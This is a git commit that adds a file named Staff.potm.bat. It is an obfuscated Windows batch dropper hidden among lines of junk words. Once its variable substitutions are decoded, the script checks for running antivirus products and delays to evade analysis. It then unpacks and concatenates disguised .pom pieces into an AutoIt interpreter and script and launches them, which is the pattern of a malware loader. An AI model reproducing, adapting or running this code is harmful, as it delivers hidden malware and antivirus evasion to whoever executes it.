9c893c2c6b2b36b1519a0e45741155f337ce6f44
PhyoPaingHtun ChiLai <83696447+PhyoPaingHtun@users.noreply.github.com>
2025-11-14 08:39:54 +0700

    Add files via upload

---
+++ Staff.potm.bat
@@ -0,0 +1,308 @@
+Set Retrieved=G
+adBInteraction(Playback(Filters(
+FRMagnitude(Fetish(Wax(
+SFcBGeneration(Temporarily(Redeem(Pcs(Setting(Clubs(Handjobs(Beats(
+lkConsequence(Figures(Chip(
+rkhGRear(Nintendo(Helen(Thehun(
+XWObligations(Improvement(Bag(
+LhMysterious(Symposium(Loose(Effort(Distributors(
+jxAppreciation(Female(Yukon(Sie(About(Searches(
+Set Flashing=q
+mWRLogic(Promptly(Differences(Couples(Expedia(Saddam(Matters(Attraction(Gray(
+BEDrinking(Threshold(Gis(Paypal(Phone(
+nZConceptual(Thereof(
+RAFireplace(
+xJfUtc(Decimal(Florists(Awards(Kw(Entered(Pledge(Earlier(
+qSadRaymond(Shame(Twist(Slow(Rod(Funky(Yu(
+Set Dentists=X
+oBzyMaple(Planner(Predict(Commercial(Arguments(
+KdWShould(Yamaha(Prince(Closed(Hearts(Precisely(Circus(Mason(
+RTYtPhotos(Blood(
+CBJames(Nintendo(Hunter(Sara(
+gIPalm(Dimensions(
+SouEugene(Raise(Insured(Hawaii(Cingular(Xi(William(Nasdaq(Docs(
+DECVer(Filme(Changing(Section(Lions(
+lDStarsmerchant(Cad(Advisors(Ww(Tool(Magic(Disco(Administered(Serves(
+pazMFormula(Horny(
+Set Springer=I
+pDTqAges(Garmin(
+MsuUsps(Defines(Ns(Bureau(Midlands(Zoo(Musical(Kit(Motherboard(
+hOJet(Venezuela(Alabama(
+uCRInstead(
+MpOcAcademy(Interval(Typical(Procedures(Met(Forge(
+YIcZSer(Img(
+ydReunion(
+raeGEducated(Theaters(Junk(Listening(Switched(Uh(Scientist(Mysterious(
+muMicrowave(Cunt(
+CYaZEz(All(
+Set Penny=n
+CdJews(Sing(
+CNOccupation(France(Kansas(Outline(Director(Score(Powerseller(Districts(Menu(
+LrlLogic(X(Projects(
+vURwCargo(Pig(Section(Neural(Enb(Cannon(Newer(Magnet(
+TtVal(Orleans(Scanned(Old(Artist(Modems(Mother(
+ThFinancial(Associations(Organizational(
+usuBuck(Museums(Manhattan(Flame(Wanting(Inventory(Condition(Glen(
+XWCongo(Broadcast(Llc(Motherboard(
+VyzDialogue(Wonderful(Upon(
+vbBIJosh(Consultancy(Completion(Accessibility(Vocals(Cdna(
+Set Corporation=u
+eMDDiversity(Detail(Paper(District(
+PeEMixture(Often(Survey(Gather(Kit(
+DmoESeparate(Many(
+MHSomerset(Criteria(Result(Fbi(
+eZDkZen(Marble(Clear(Hostel(Properties(Finally(Exhibition(
+JOYoTalked(Wagner(Temporarily(
+xHAw(Theories(Occurrence(Ts(Wars(Specifies(Spears(
+Set Striking=6
+RAWaParcel(Nearly(Usa(Property(Immunology(Sullivan(Atm(Tropical(
+ZjCDeleted(Freebsd(Alike(
+iQEABaths(
+lFlTViewing(
+CUhdPrinter(Clean(Getting(Close(
+LHRule(Venue(Literacy(
+pNZBroad(Reynolds(Effects(Outcome(
+yAQCommitment(Symantec(Lectures(Bathrooms(Prescribed(Phenomenon(
+Set Mpeg=p
+cRuSolar(Packages(Crossword(Jennifer(Assumption(Cyprus(Nova(
+cbgSuffer(Highest(
+thnKCotton(
+vjTunisia(Admission(Boys(Main(Threatening(Creature(Workshops(
+DwyActing(Mac(Debate(Seats(Wichita(Panama(
+Set Postage=b
+rnuReads(
+abRole(Sarah(Clicks(Ai(
+tgSox(Spoken(Cultures(Quilt(Switching(
+MJtrGeographic(Ron(
+cxGarlic(Frequently(Un(Salary(Mat(Pdas(Isbn(
+srCIma(Deployment(Greenhouse(Antonio(Generous(Convertible(Lines(Joined(Tournament(
+NxPackard(Attractive(Delivers(Barcelona(
+FzOPenguin(Pure(Feed(
+gpNoOrange(Comprehensive(Profession(Pending(Sonic(
+Set Audi=z
+NxMKHeading(Dodge(Ipaq(Leather(Policy(
+yRReasonably(Harry(Twins(Suitable(
+FGBool(Defend(Autumn(Button(Ta(Des(
+bgContinually(By(
+KmtFRemoving(Traffic(Livesex(Gmt(
+ZQNcaa(Stephanie(Buffer(Conduct(
+llugOptimal(Guided(Madagascar(Aims(Integral(
+cWPsi(Possess(Amazoncom(Tries(Speech(Displaying(Spas(Struct(Providing(
+LjEric(
+Set Knows=E
+IFAfrican(Appeared(Distributions(
+OEtrAcer(Antonio(Talked(Revolution(V(Especially(Lil(Oh(Gage(
+uUiShoppingcom(Entertaining(
+WPrcPunishment(Crowd(Ladder(Scratch(
+BLpKDeserve(Everybody(Gi(
+beEqual(Chat(
+HonTe(Strike(Ins(Fr(
+IgManually(
+sIhLotus(Wn(
+pPRHSharp(Restaurant(Steel(Pants(Services(Lady(Treat(Asbestos(
+Set Consulting=1
+cLSolo(Navigator(
+dVqiReservation(Array(Grab(Colon(Development(Bands(Contacting(Metallica(Porsche(
+yUJoAcoustic(Addressed(Penn(Designers(Locked(London(Prefers(Nudist(Design(
+geKPine(Moderator(Chi(Commodities(Attitudes(Netherlands(Exhibitions(
+gatMalta(
+adRBPreferences(Whereas(Endangered(Diseases(Rising(Offers(
+rbiWhatever(Analytical(Kijiji(Separated(Addressing(Counties(Usual(Pt(
+DEGEllen(Clinics(Hrs(Workers(Rear(Designs(Tune(
+Set Shooting=s
+ilzNActivities(Order(Adult(Sword(Cleaner(
+DqQWicked(Cart(Orbit(Limousines(Ne(Because(
+qzIsraeli(Fifty(Bright(Milfhunter(Pipeline(Spot(Speeches(Nebraska(
+CuAdditional(Hl(State(
+rsxFatal(
+Set Investors=D
+AqFo(Valid(Hack(Pl(Essay(
+ZLN(African(
+vaajModems(Lil(Date(Rocks(Za(Application(Highs(Trusts(Albert(
+LJPhoenix(Commitments(Settings(Terrace(Penalty(Lawyer(
+yZReads(Madagascar(Sacramento(Rent(Stunning(
+udCompany(Folk(
+ZOOThreesome(Wise(Release(Ears(
+Set Qualified=k
+gzRqSingle(Prev(Usr(Alignment(Industrial(Tulsa(Serial(Pubs(Contacted(
+NBPClinics(
+rnPond(Entertainment(Evident(Hans(
+DyGear(
+YDUYGraduate(Msn(Delete(Enjoying(Taxation(Ralph(Earth(
+QIAl(Happens(Oecd(Curriculum(Shower(Courier(
+mdHAProblems(Intro(Fares(
+Set Widespread=g
+ZjPopulations(Blowjob(Date(Naples(
+EcWAcquisitions(Polished(Personally(Naval(Noble(
+FjGFestivals(Controllers(Cedar(Washer(Eos(Tested(Sherman(Welfare(Recognition(
+JXZmCartridge(Dubai(Materials(Queen(Remedies(Booty(Total(Enabled(
+FFCBChemistry(Adjusted(Heating(
+tViCant(Tries(Programming(Medicine(Offers(
+pPeJRp(Introductory(
+eBScanning(Html(Titten(Hall(Forums(Processes(Fight(Done(
+Set Antibody=Q
+PizElderly(Univ(
+WVAyAirports(Fo(Soa(
+pTqPursue(Karma(Tripadvisor(Statute(Lexington(Single(Cart(Mounting(
+DuPeru(Thanksgiving(Dealt(Predict(Malaysia(Fraser(Providing(Castle(
+srDocuments(Items(Domain(
+ittPlaced(Somewhere(Shed(Entered(Couples(Loved(Ordered(Jacob(Sensor(
+JaxMortgages(Cannon(Bulletin(
+wQSurgery(Predict(
+cJEMass(
+Set Anytime=w
+xTqdInterests(All(
+bkAcids(Wilderness(
+fEKClasses(Covers(Sense(Fox(
+SwBGInexpensive(Museums(Technique(Certification(Ships(Provided(Sleeping(
+FPBrad(Harper(Alcohol(
+tOMarketplace(Concentrate(Lying(Creating(Column(Square(
+cywCoastal(
+IRResolution(Suggestions(Fig(Worst(
+Set Pc=5
+YsqACostumes(Mods(Refer(Peer(Tests(Arlington(Dictionaries(
+SzNXDeadline(
+dugEFtp(Telecommunications(Oe(Tries(Solved(Bobby(Allowed(Expenses(Eugene(
+kaYDPads(Mrna(Continues(Deutsch(Manner(Verse(Mhz(Duty(Investigate(
+hGEven(Gzip(
+Set Nobody=N
+cehSubsequent(Ruled(Deliver(Directors(Webmaster(Strength(Kilometers(Driving(
+MbWSimple(
+PQAvon(Villas(Black(Quit(Scientific(Price(Day(
+MpSmoke(Adsl(Role(Examined(Bt(Consoles(Influenced(Lawsuit(
+ZDuHFi(Survive(Cattle(Bukkake(
+dTEWaves(Entering(Rose(Celebs(Workers(Mate(
+YyKaraoke(Speak(Ranking(
+FYGJSwap(Sara(Lace(
+bsbQTed(
+Set Forgot=t
+SsExpert(Nuts(Babes(Promoting(Pendant(Roller(Withdrawal(Ti(Nutrition(
+zoPBBacterial(Kennedy(Escorts(Scholar(Eddie(Circles(
+wmCalculator(Politicians(Emergency(Server(
+rpEiOriental(Audi(Times(Designs(
+SioHeated(Abstract(Invitation(Quickly(
+gSAwesome(Antigua(Simply(Essence(Moss(Nascar(Election(
+tJyRed(Containers(Morris(Pentium(Commission(Unexpected(
+Set Mineral=.
+eDwVGiving(Nuts(Analysts(Invite(
+ipqwTestimonials(Tariff(Wi(Affairs(
+xDZHot(Rendered(
+gyAmendment(Indication(Refund(
+UZVlWebcam(Eligible(Optimize(Portugal(Scientist(Hormone(Heater(Robert(
+LhLike(Supports(Expect(
+nESPm(Creations(Extend(Trunk(Compact(
+JbpuWider(Popular(Chinese(Appointment(
+NTRevolution(Admissions(
+Set Mass=3
+fXKoYemen(Gg(Efforts(Ri(Basketball(Thirty(
+hABuck(Happening(Descending(Expected(Democrat(Citation(Glasses(Occupied(Truth(
+CxPs(Median(Glasgow(Gel(
+npdDispatch(Posts(Starring(Estimate(
+ZwDPics(Lookup(Laundry(Bermuda(Lightweight(Lambda(Alert(Wi(Skirts(
+sOQwAnalysis(Mpg(Copy(Privacy(Link(Guidance(
+Set Rogers=+
+TpOInspired(Smile(Lower(
+AKuCSyntax(Funky(Chick(Secondary(Clocks(Authorized(Hamilton(
+UxPMas(Options(Devices(Worship(Experts(Ryan(
+WXCFRuth(Runtime(Virtue(Exterior(Combines(
+JlSSilver(Vacation(Amanda(Qc(Publish(Monitors(Strict(Capture(
+PYIVDrives(Seller(
+Se%Forgot% %Audi%%Anytime%A%Forgot%A%Nobody%BCvLH%Forgot%Y%Flashing%Mf%Nobody%%Widespread%%Antibody%US%Penny%%Mpeg%%Investors%o%Mpeg%mYFKY=Jeff%Mineral%com
+gGMdOe Adventures Graphical Brad Bali Divided Happiness 
+FMKQVillas Nutritional Audio 
+rQShot Mines Boss Sum Revelation Arbitration 
+Se%Forgot% JRd%Nobody%%Shooting%J%Retrieved%%Springer%%Widespread%ZH%Audi%YPaCWF%Flashing%c%Widespread%Pm%Postage%r%Knows%%Qualified%%Anytime%ArxdYHd= 
+NWBreathing Kingdom Colors 
+KdnSupervisors Modes Bits Gamespot Trials Cpu Google Wayne 
+DTZCReseller Villa Aquarium Torture Loose Fixtures Ala Telephone Boss 
+IAEdManhattan Trademarks 
+QfXZConfirmation Compilation Pc Funeral Bars Manuals Rapidly 
+Se%Forgot% aZ%Nobody%RmP=%Pc%
+JpMkSchool Scores Broke Respond 
+noLcAware Sponsor Enclosure Photoshop Brooks Clarity 
+YNStruct Rd Talent 
+XszeSlovenia Grant Monroe Tour Collar Cake Voting 
+CYBCRwanda Adjust Encourage Degree Democratic 
+OOCosta Work White Leon 
+ViPainted Beach Bros About Mumbai Demonstrates Knock Turning 
+BoProvincial Acting Cuisine Presentation Garlic 
+SJKyDom Trick Genetics 
+EWAttraction Armstrong Min Reconstruction Fabulous Indicating 
+%Forgot%a%Shooting%%Qualified%li%Shooting%%Forgot% | fi%Penny%d%Shooting%%Forgot%r /%Springer% "o%Mpeg%%Shooting%%Shooting%vc %Anytime%r%Shooting%a" & if %Penny%o%Forgot% errorlevel %Consulting% %Mpeg%i%Penny%%Widespread% -%Penny% %Consulting%99 %Consulting%27%Mineral%0%Mineral%0%Mineral%%Consulting%
+pOPBros Logos Ol 
+MlEdinburgh Card Breasts Api Installation Blow Madness 
+RtlrYoga Interact Ireland Bloody Therapist Were Portfolio Rug Diary 
+NtTxSelling Penalty Net Passenger Whose Soc Paso Lou Veteran 
+yGPremium Named Guys Wonder Publishers Tickets Euro Permissions 
+Se%Forgot% /a Fl=%Striking%%Striking%98%Consulting%
+vNBAmenities Deferred Flower Venezuela Moved Prot Mats Vpn Connectors 
+DttUganda Likes Betting Scale 
+%Forgot%a%Shooting%%Qualified%li%Shooting%%Forgot% | fi%Penny%d%Shooting%%Forgot%r "So%Mpeg%ho%Shooting%Heal%Forgot%h %Postage%d%Shooting%erviceho%Shooting%%Forgot% Ava%Shooting%%Forgot%U%Springer% AV%Retrieved%U%Springer% %Penny%%Shooting%W%Shooting%cSvc e%Qualified%r%Penny%" & if %Penny%o%Forgot% errorlevel %Consulting% Se%Forgot% %Audi%%Anytime%A%Forgot%A%Nobody%BCvLH%Forgot%Y%Flashing%Mf%Nobody%%Widespread%%Antibody%US%Penny%%Mpeg%%Investors%o%Mpeg%mYFKY=A%Corporation%%Forgot%o%Springer%%Forgot%%Mass%%Mineral%exe & Se%Forgot% JRd%Nobody%%Shooting%J%Retrieved%%Springer%%Widespread%ZH%Audi%YPaCWF%Flashing%c%Widespread%Pm%Postage%r%Knows%%Qualified%%Anytime%ArxdYHd=%Mineral%a%Mass%x & Se%Forgot% aZ%Nobody%RmP=%Mass%00
+tImOWebsites Beaches Fa Relates 
+oUSpecialty Nut Efficient Newscom Assessments 
+WjLTravis Hop Ordinance Slowly 
+LCvHPantyhose Tires Fuel Remark 
+DFGCultural Ata 
+cmd /c md %Fl%
+GjMHAmended Difficulties His Pale Form Dod Modules Finishing Results 
+uFProvidence Lindsay 
+QWjAdvised Kingdom Transsexual Enlarge Alert 
+sFNMounts Cruise Beach Op Grande Gp Y Above Marker 
+ex%Forgot%rac%Mass%2 /Y /%Knows% %Retrieved%lory%Mineral%%Mpeg%o%Forgot%m
+jQLas Observation Aging Fm Sends 
+QdBibliography Through Manually Fd Brooks 
+<%Penny%%Corporation%l %Shooting%e%Forgot% /%Mpeg% ="MZ" > %Fl%\%zwAtANBCvLHtYqMfNgQUSnpDopmYFKY%
+WYFNThrow Loading Montreal Euros Cake Jerry 
+xizOIntegrated Settle Heated Johnston Who Share Match 
+gLRapid Stomach Armstrong Ta Government Prefix Citizen Constraint Pairs 
+UFIncident 
+ILTries Food Quantitative British Stuffed Tagged Ev Constitution Gasoline 
+oeDfMachines Stress 
+rFvWidth Commercial Chains Outdoor Minnesota Context Expanding 
+fi%Penny%d%Shooting%%Forgot%r /V "%Dentists%i" Sec%Forgot%io%Penny% >> %Fl%\%zwAtANBCvLHtYqMfNgQUSnpDopmYFKY%
+iQpaDownload Nov Xml Collective 
+pdlNails 
+cmd /c co%Mpeg%y /%Postage% %Fl%\%zwAtANBCvLHtYqMfNgQUSnpDopmYFKY% %Rogers% Trea%Forgot%ed %Rogers% Co%Penny%%Forgot%em%Mpeg%orary %Rogers% %Knows%%Penny%viro%Penny%me%Penny%%Forgot%%Shooting% %Rogers% Cell %Rogers% A%Anytime%f%Corporation%l %Rogers% S%Forgot%omach %Rogers% Ar%Forgot%h%Corporation%r %Rogers% %Knows%very%Anytime%here %Rogers% S%Forgot%ory %Rogers% Proceed%Shooting% %Fl%\%zwAtANBCvLHtYqMfNgQUSnpDopmYFKY%
+vCENet Buttons Modeling Curve Gc Mae 
+kdyTAged Allow Cute Generates 
+QhjnAngle Db Gnu Russian Cest Menus Channel Weekend Sake 
+baBKBus Worker Regulated Papers Ro Sun 
+dYpFraction 
+HFFifteen Bowling Producing 
+cd %Fl%
+RFxBarbados Fast Fare Boxed 
+ImBNSociology Literary Notified Prophet Ambassador Myspace Trainer Helps 
+cmd /c co%Mpeg%y /%Postage% %Mineral%%Mineral%\%Springer%%Shooting%rael%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\%Knows%xcha%Penny%%Widespread%e%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Ro%Postage%er%Forgot%%Shooting%o%Penny%%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Ome%Widespread%a%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Re%Widespread%%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Liver%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Pa%Widespread%e%Mineral%%Mpeg%o%Forgot%m %Rogers% %Mineral%%Mineral%\Piece%Shooting%%Mineral%%Mpeg%o%Forgot%m O%JRdNsJGIgZHzYPaCWFqcgPmbrEkwArxdYHd%
+leClocks Iron Bolt 
+RFEating Gives Five 
+JBCoordinated Barcelona 
+ARsSavannah Rv Referred Hanging Pill Lady Honor Hockey 
+jkAcer 
+HPPendant Trainers Jump Manager 
+ozqItsa Psi Fcc Backup Organizer 
+%Shooting%%Forgot%ar%Forgot% %zwAtANBCvLHtYqMfNgQUSnpDopmYFKY% O%JRdNsJGIgZHzYPaCWFqcgPmbrEkwArxdYHd%
+AxKzCollectible Brighton Stones Suggest Gasoline Boards Adelaide Pest 
+XDgSubstantially 
+SgsFGovernments Citizen Airport Quickly 
+WGExpert Lamb Sandwich Valid Hitting Minority Je Server 
+JrrFool Wider Loc Catalog 
+
+NvSkBell 
+bqCarb 
+cd %Mineral%%Mineral%
+mosClose 
+TBxCultures Node 
+BZComparing 
+EwYHimself Jaguar Document Refurbished Structural Hay Britain Intro 
+mUGEAirlines Victim 
+ApvExchanges Oregon Optimum Rod 
+qcRMent Remembered Issued Outlet Reflections Stuffed 
+vNbcHardcover Rational Provider Peers Veteran Saves Acquisition Dangerous Cest 
+SCBlocks Statistics Partly Washington Enter 
+choice /d y /%Forgot% %aZNRmP%
+HuWiVessels Its 
+lWRe Accordingly Interactions Toyota Tim Transparent Brooks 
+jcFLabour Tf Typing Cir 
+qynAuburn Rebound Earning Each Saturn 
+mqdAlt Cum Equity Cal Madagascar Acrobat Computation Vacancies 
+
